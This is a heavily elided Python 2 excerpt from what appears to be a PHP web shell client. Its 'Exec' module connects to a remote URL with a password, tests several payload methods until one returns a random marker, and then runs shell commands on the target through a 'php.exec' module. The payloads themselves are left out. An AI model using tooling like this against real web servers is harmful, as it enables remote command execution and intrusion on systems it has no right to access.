...
class Exec(Module):
    ...
    def __init__( self, moddict , url, password):
        ...
        moddict.load('php.exec', url, password)
    ...
    def _probe( self ):
            ...
            for name, payload in vect.items():
                try:
                    ...
                    if response == str(rand):
                        ...
                        print "[system.exec] Shell interpreter loaded using method '%s'" % name
                        self.loaded = True
                        return
        ...
        raise ModuleException("shell.exec",  "Shell interpreter loading failed")
    ...
    def run( self, cmd, err_to_stdout = True, payload = None ):
        ...
        return self.moddict['php.exec'].run(payload)
